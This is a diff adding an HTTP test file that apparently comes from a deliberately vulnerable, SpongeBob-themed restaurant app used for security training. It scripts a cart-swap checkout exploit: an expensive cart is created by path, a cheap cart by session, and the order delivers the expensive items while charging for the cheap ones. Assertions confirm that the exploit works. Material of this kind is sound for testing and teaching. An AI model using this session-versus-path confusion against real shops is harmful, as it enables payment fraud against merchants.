@@ -1,0 +1,146 @@
+# @import ../_imports.http
+
+# =============================================================================
+# VULNERABILITY: R03 Cart Swap Checkout (session vs path confusion)
+# =============================================================================
+#
+# DESCRIPTION:
+#   resolve_trusted_cart() prefers session cart over path cart.
+#   The charge_customer_with_hold decorator charges for the session cart,
+#   but checkout_cart resolves the cart again and might get a different cart!
+#
+# ATTACK SCENARIO:
+#   Plankton exploits this by:
+#   1. Creating an expensive cart WITHOUT session (Basic Auth only)
+#   2. Logging in to establish a session
+#   3. Creating a cheap cart (stored in session)
+#   4. Checking out the EXPENSIVE cart via path, but paying for CHEAP session cart
+#
+# IMPACT:
+#   Price manipulation - customer receives expensive items but pays cheap price.
+#
+# STATUS: VULNERABLE in v302 (exploit succeeds)
+# =============================================================================
+
+# =============================================================================
+# SETUP: Get menu item prices
+# =============================================================================
+
+### Get menu items for price reference
+# @name seed
+{{
+  await platform.seed({
+    plankton: 200
+  });
+}}
+# @ucskip
+# @tag cart, r03, v302, vulnerable
+GET /menu
+
+@krabby_patty_id = {{$(response).find(i => i.name === "Krabby Patty").id}}
+@krabby_patty_price = {{$(response).find(i => i.name === "Krabby Patty").price}}
+@ultimate_feast_id = {{$(response).find(i => i.name === "Ultimate Krabby Feast").id}}
+@ultimate_feast_price = {{$(response).find(i => i.name === "Ultimate Krabby Feast").price}}
+
+# =============================================================================
+# STEP 1: Create EXPENSIVE cart (no session - Basic Auth only)
+# =============================================================================
+
+### Create expensive cart without session
+# @name expensive_cart
+# @forceRef seed
+# @tag cart, r03, v302, vulnerable
+POST /cart?restaurant_id=1
+Authorization: {{auth.basic("plankton")}}
+
+@expensive_cart_id = {{$(response).field("cart_id")}}
+?? js $(response).status() == 201
+
+### Add expensive item to expensive cart
+# @name expensive_cart_with_item
+# @forceRef expensive_cart
+# @ucskip endpoint
+# @tag cart, r03, v302, vulnerable
+POST /cart/{{expensive_cart_id}}/items
+Authorization: {{auth.basic("plankton")}}
+Content-Type: application/json
+
+{ "item_id": "{{ultimate_feast_id}}" }
+
+?? js $(response).isOk() == true
+
+# =============================================================================
+# STEP 2: Create CHEAP cart (with session)
+# =============================================================================
+
+### Login and create cheap cart (stored in session)
+# @name cheap_cart
+# @forceRef expensive_cart_with_item
+{{
+  exports.session = await auth.login("plankton");
+}}
+# @tag cart, r03, v302, vulnerable
+POST /cart?restaurant_id=1
+Cookie: {{session}}
+
+@session = {{extractCookie(response)}}
+@cheap_cart_id = {{$(response).field("cart_id")}}
+?? js $(response).status() == 201
+
+### Add cheap item to cheap cart
+# @name cheap_cart_with_item
+# @forceRef cheap_cart
+# @ucskip endpoint
+# @tag cart, r03, v302, vulnerable
+POST /cart/{{cheap_cart_id}}/items
+Cookie: {{session}}
+Content-Type: application/json
+
+{ "item_id": "{{krabby_patty_id}}" }
+
+?? js $(response).isOk() == true
+
+# =============================================================================
+# EXPLOIT: Checkout EXPENSIVE cart path with CHEAP session cart
+# =============================================================================
+
+### Path says expensive cart, session has cheap cart
+# charge_customer_with_hold charges for session cart (cheap)
+# but checkout_cart creates order from path cart (expensive)
+# @name exploit_checkout
+# @forceRef cheap_cart_with_item
+# @tag cart, r03, v302, vulnerable
+POST /cart/{{expensive_cart_id}}/checkout
+Cookie: {{session}}
+Content-Type: application/json
+
+{ "tip": 0, "delivery_address": "Chum Bucket" }
+
+@order_id = {{$(response).field("order_id")}}
+?? js $(response).status() == 201
+
+# =============================================================================
+# IMPACT: Verify received expensive items, paid cheap price
+# =============================================================================
+
+### Received EXPENSIVE items (Ultimate Krabby Feast)
+# @forceRef exploit_checkout
+# @ucskip
+# @tag cart, r03, v302, vulnerable
+GET /orders
+Cookie: {{session}}
+
+?? js $(response).last().order_id == {{order_id}}
+?? js $(response).last().items.length == 1
+?? js $(response).last().items[0].item_id == {{ultimate_feast_id}}
+?? js $(response).last().items[0].name == Ultimate Krabby Feast
+
+### Only charged for CHEAP items (Krabby Patty + delivery fee)
+# @ref exploit_checkout
+# @ucskip
+# @tag cart, r03, v302, vulnerable
+GET /account/info
+Cookie: {{session}}
+
+?? js parseFloat($(response).field("balance")) == {{200 - parseFloat(krabby_patty_price) - 5}}
+
